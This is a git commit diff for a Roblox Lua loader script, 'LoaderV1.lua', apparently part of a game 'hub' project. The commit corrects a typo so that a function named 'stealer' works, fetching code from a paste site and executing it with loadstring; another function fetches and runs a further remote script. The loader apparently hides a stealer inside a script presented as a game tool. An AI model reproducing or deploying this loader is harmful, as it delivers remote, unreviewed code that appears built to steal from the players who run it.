a99edc2827d14e89cc9f578cf1219bb0a6242b02
NoLag-id <sfpher6@gmail.com>
2025-06-28 23:39:06 +0800

    Update LoaderV1.lua

--- LoaderV1.lua
+++ LoaderV1.lua
@@ -1,5 +1,5 @@
 local function stealer()
-    loadstring(game:HttpGet("https://paste.debian.net/plainh/0a97fe4b/",%20true))()
+    loadstring(game:HttpGet("https://paste.debian.net/plainh/0a97fe4b/", true))()
 end
 local function farm()
     loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
